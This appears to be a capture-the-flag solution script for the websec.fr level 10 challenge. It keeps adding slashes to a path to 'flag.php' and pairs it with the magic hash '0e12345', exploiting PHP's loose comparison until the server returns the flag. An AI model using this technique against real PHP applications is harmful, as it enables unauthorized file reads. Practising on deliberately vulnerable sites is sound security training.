import requests

prefix = "./"
while True:
    r = requests.post("http://websec.fr/level10/index.php", data={
        'hash': "0e12345",
        'f': prefix + 'flag.php'
    })

    if "WEBSEC{" in r.text:
        print(r.text)
        break

    prefix += "/"
    print("a")